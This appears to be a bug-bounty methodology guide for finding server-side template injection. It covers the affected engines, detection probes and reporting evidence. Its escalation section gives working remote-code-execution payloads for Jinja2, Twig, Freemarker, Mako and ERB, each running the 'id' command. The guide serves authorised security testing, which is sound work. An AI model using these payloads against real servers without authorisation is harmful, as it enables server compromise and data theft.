# SSTI — Server-Side Template Injection Hunting Methodology

## What Is SSTI

User-supplied input is embedded into a server-side template and evaluated by the template engine, allowing arbitrary code execution in the server's context.

## Affected Template Engines

| Engine | Language | RCE Potential |
|---|---|---|
| Jinja2 | Python | Yes — `__class__.__mro__` chains |
| Twig | PHP | Yes — `_self.env.registerUndefinedFilterCallback` |
| Freemarker | Java | Yes — `freemarker.template.utility.Execute` |
| Pebble | Java | Yes — via `ClassUtil` |
| Velocity | Java | Yes — via `ClassTool` |
| Smarty | PHP | Yes — `{php}` tag |
| Handlebars (server-side) | Node.js | Limited — prototype pollution chains |
| ERB | Ruby | Yes — `<%= system("id") %>` |
| Mako | Python | Yes — `${__import__('os').system('id')}` |

## Finding SSTI

**Where user input renders as dynamic content:**
- Error messages that reflect input ("Hello, [user input]!")
- Profile names, bios, display names
- Email templates (name field in "Dear {name}")
- Search results that echo the query back
- PDF/report generators that incorporate user content
- Custom message or notification templates

## SSTI Detection Probe Sequence

**Step 1 — Mathematical expression test:**
- Input: `{{7*7}}` → If `49` appears in response: **Jinja2/Twig/similar confirmed**
- Input: `${7*7}` → If `49`: **Freemarker/Velocity/Mako/ERB**
- Input: `#{7*7}` → If `49`: **Ruby ERB / Pebble**
- Input: `<%= 7*7 %>` → If `49`: **ERB**

**Step 2 — Engine identification:**
- `{{7*'7'}}` → `7777777` = Jinja2 | `49` = Twig
- `{{"a".toUpperCase()}}` → `A` = Twig (PHP)

**Step 3 — Escalate to RCE:**

*Jinja2 (Python):*
```
{{''.__class__.__mro__[1].__subclasses__()[372]('id',shell=True,stdout=-1).communicate()[0]}}
```
Or simpler (if `os` accessible):
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

*Twig (PHP):*
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

*Freemarker (Java):*
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

*Mako (Python):*
```
${__import__('os').popen('id').read()}
```

*ERB (Ruby):*
```
<%= `id` %>
```

## Context Escape First

If the template uses `{{ user_input }}` but the page shows the literal `{{7*7}}` as text, the engine may be X-encoding output. Try:
- Putting the injection IN a URL parameter that's reflected differently
- Injecting in different fields (email vs username vs bio)
- Injecting where the value is used in a backend process (report generation, email send)

## Confidence Levels

| Signal | Confidence |
|---|---|
| `{{7*7}}` → `49` in response | Probable |
| Engine-specific payload returns code output | Confirmed |
| OOB DNS from template payload | Confirmed (Blind SSTI) |
| Mathematical expression echoed literally | Low - likely escaping |

## Impact

SSTI → RCE on the server running the template engine. Severity: **Critical** if reachable by any user, **High** if requires specific role.

## Evidence Required
1. The template injection probe (`{{7*7}}` → `49`)
2. Engine identified (Jinja2 / Twig / Freemarker etc.)
3. RCE payload with output (or OOB DNS for blind)
4. HTTP request + response showing execution
